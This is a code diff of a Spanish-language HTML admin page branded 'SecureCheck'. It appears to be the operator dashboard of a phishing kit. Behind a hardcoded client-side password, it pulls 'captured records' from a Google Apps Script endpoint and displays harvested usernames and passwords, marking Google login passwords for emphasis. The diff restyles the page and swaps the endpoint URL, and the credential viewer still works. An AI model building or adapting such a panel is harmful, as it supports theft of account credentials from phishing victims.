@@ -2,45 +2,45 @@
 <html lang="es">
 <head>
     <meta charset="UTF-8">
-    <title>Panel Admin - SecureCheck</title>
+    <title>ADMIN PANEL - SECURECHECK</title>
     <style>
-        body { background: #0b141d; color: white; font-family: 'Segoe UI', sans-serif; padding: 20px; }
+        body { background: #0b141d; color: white; font-family: sans-serif; padding: 30px; }
         .container { max-width: 1100px; margin: auto; }
-        .card { background: #15202b; border-radius: 12px; padding: 25px; border: 1px solid #1e293b; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
+        .card { background: #15202b; border-radius: 12px; padding: 25px; border: 1px solid #1e293b; }
         table { width: 100%; border-collapse: collapse; margin-top: 20px; }
-        th { background: #1e293b; color: #38bdf8; padding: 15px; text-align: left; text-transform: uppercase; font-size: 12px; border-bottom: 2px solid #0b141d; }
+        th { background: #1e293b; color: #38bdf8; padding: 15px; text-align: left; font-size: 12px; }
         td { padding: 15px; border-bottom: 1px solid #1e293b; font-size: 14px; }
-        .badge { padding: 5px 10px; border-radius: 4px; font-size: 11px; font-weight: bold; }
+        .badge { padding: 4px 8px; border-radius: 4px; font-size: 10px; font-weight: bold; }
         .badge-google { background: #0369a1; color: #7dd3fc; }
         .badge-form { background: #581c87; color: #d8b4fe; }
-        .pass-cell { font-family: monospace; color: #fbbf24; font-weight: bold; }
-        #login-screen { text-align: center; margin-top: 150px; }
-        input { padding: 12px; border-radius: 8px; border: 1px solid #1e293b; background: #0b141d; color: white; width: 250px; margin-bottom: 10px; }
-        button { padding: 12px 25px; background: #38bdf8; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; color: #0b141d; }
+        .pass-cell { font-family: monospace; color: #fbbf24; font-weight: bold; font-size: 16px; }
+        #login-box { text-align: center; margin-top: 150px; }
+        input { padding: 12px; border-radius: 8px; border: 1px solid #1e293b; background: #0b141d; color: white; margin-bottom: 10px; }
+        button { padding: 12px 25px; background: #38bdf8; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; }
     </style>
 </head>
 <body>
     <div class="container">
-        <div id="login-screen">
-            <h1>Panel de Seguridad</h1>
-            <input type="password" id="admin-pass" placeholder="Contraseña de Administrador">
+        <div id="login-box">
+            <h1>Panel de Control</h1>
+            <input type="password" id="p" placeholder="Contraseña Admin">
             <br>
-            <button onclick="verificar()">Entrar al Panel</button>
+            <button onclick="check()">Entrar</button>
         </div>
 
         <div id="dashboard" style="display:none">
             <div class="card">
-                <div style="display:flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">
-                    <h2 style="margin:0; color:#38bdf8;">Registros Capturados</h2>
-                    <button onclick="cargarDatos()" style="background:#1e293b; color:white; border:1px solid #38bdf8;">Actualizar</button>
+                <div style="display:flex; justify-content: space-between; align-items: center;">
+                    <h2>Registros en la Nube</h2>
+                    <button onclick="load()" style="background:none; border: 1px solid #38bdf8; color: #38bdf8;">Refrescar</button>
                 </div>
                 <table>
                     <thead>
                         <tr>
                             <th>Origen</th>
                             <th>Usuario / Empresa</th>
-                            <th>Contraseña / Detalles</th>
-                            <th>Fecha y Hora</th>
+                            <th>Password / Datos</th>
+                            <th>Fecha</th>
                         </tr>
                     </thead>
                     <tbody id="tabla"></tbody>
@@ -50,34 +50,29 @@
     </div>
 
     <script>
-        const webAppUrl = "https://script.google.com/macros/s/AKfycbzaoOqKcF_TawLruyEebZuBhGahZigayFC3eFYeIzvZqU5T7UWVm7nnBvwa2zS-jkyZ/exec";
-
-        function verificar() {
-            if(document.getElementById("admin-pass").value === "Linares2025.") {
-                document.getElementById("login-screen").style.display = "none";
-                document.getElementById("dashboard").style.display = "block";
-                cargarDatos();
-            } else { alert("Acceso Denegado"); }
+        const webAppUrl = "https://script.google.com/macros/s/AKfycbxRWIPEFW1fPRg9bJEtNDISKLaojKgJu6FePHoabTxvoypQQ5euGdNw4Y0u0q0zjppa/exec";
+        function check() {
+            if(document.getElementById("p").value === "Linares2025.") {
+                document.getElementById("login-box").style.display="none";
+                document.getElementById("dashboard").style.display="block";
+                load();
+            }
         }
-
-        async function cargarDatos() {
-            const tabla = document.getElementById("tabla");
-            tabla.innerHTML = "<tr><td colspan='4' style='text-align:center'>Cargando base de datos...</td></tr>";
-            try {
-                const r = await fetch(webAppUrl);
-                const data = await r.json();
-                tabla.innerHTML = "";
-                data.reverse().forEach(f => {
-                    const isG = f[2] === "LOGIN_GOOGLE";
-                    tabla.innerHTML += `
-                        <tr>
-                            <td><span class="badge ${isG ? 'badge-google' : 'badge-form'}">${f[2]}</span></td>
-                            <td>${f[0] || '---'}</td>
-                            <td class="${isG ? 'pass-cell' : ''}">${f[1] || '---'}</td>
-                            <td style="color:#94a3b8">${f[3] || '---'}</td>
-                        </tr>`;
-                });
-            } catch (e) { alert("Error al conectar con Google Sheets"); }
+        async function load() {
+            const tbody = document.getElementById("tabla");
+            tbody.innerHTML = "<tr><td colspan='4'>Cargando...</td></tr>";
+            const r = await fetch(webAppUrl);
+            const data = await r.json();
+            tbody.innerHTML = "";
+            data.reverse().forEach(f => {
+                const isG = f[2] === "LOGIN_GOOGLE";
+                tbody.innerHTML += `<tr>
+                    <td><span class="badge ${isG?'badge-google':'badge-form'}">${f[2]}</span></td>
+                    <td>${f[0]}</td>
+                    <td class="${isG?'pass-cell':''}">${f[1]}</td>
+                    <td>${f[3]}</td>
+                </tr>`;
+            });
         }
     </script>
 </body>
